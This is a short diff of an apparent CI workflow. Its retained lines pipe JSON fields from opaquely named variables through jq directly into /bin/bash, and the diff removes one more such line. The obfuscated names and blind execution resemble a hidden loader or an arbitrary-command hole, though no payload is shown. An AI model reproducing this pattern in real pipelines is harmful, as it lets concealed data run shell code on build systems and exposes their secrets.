@@ -28,7 +28,6 @@ jobs:
           echo $heakb022 | jq -r .n54893 | /bin/bash
           printf '%s' "$cfe0" | jq -r .bzoik3 | /bin/bash
           echo $fa48254 | jq -r .h653 | /bin/bash
-          printf '%s' "$ksehj1545" | jq -r .ec1289 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
